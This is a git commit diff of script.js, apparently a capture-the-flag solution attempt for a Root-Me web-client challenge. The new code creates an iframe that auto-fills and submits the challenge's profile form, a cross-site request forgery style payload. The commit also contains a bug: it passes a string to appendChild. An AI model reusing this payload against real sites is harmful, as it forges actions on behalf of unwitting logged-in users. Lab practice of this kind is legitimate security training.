47636a568f5b0aaf203887e87ef25091bf63f550
fullgitstack <mackormack0@gmail.com>
2025-10-13 15:57:48 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,12 +1,14 @@
-const ifr = document.querySelector("#principalObject");
+const html1 = `
+<iframe
+ id="iframe1"
+ src="http://challenge01.root-me.org/web-client/ch23/?action=profile"
+ onload=' const ifr = document.querySelector("#iframe1"); ifr.contentDocument.querySelector("#username").value = "test1"; ifr.contentDocument.querySelector("#status").checked = true; ifr.contentDocument.forms[0].submit()'
+>
+</iframe>
 
-ifr.addEventListener("load", () => {
-ifr.contentDocument.querySelector("#username").value = "test1"
-ifr.contentDocument.querySelector("#status").checked = true
+`
 
-ifr.contentDocument.forms[0].submit()
-  
-})
+document.body.appendChild(html1)
 
 
 
